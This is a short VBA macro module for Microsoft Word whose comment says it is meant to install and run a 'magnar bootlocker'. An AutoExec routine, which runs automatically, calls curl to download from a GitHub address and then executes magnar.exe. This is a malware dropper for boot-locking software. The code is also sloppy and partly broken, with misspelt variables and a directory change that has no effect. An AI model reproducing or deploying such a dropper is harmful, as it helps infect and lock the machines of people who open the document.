' This file contains the word macro that should be able to install and rum the magnar bootlocker autonomous
Attribute VB_Name = "NewMacros"
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExec"
    '
    '
    '
    Dim Dekstop
    Desktop = Shell("cd %USERPROFILE%/Desktop", 1)
    
    Dim RetVal
    RetVal = Shell("curl -LJO https://github.com/blj-magnar/", 1)
    
    Dim Exec
    Exec = Shell("magnar.exe", 1)
End Sub
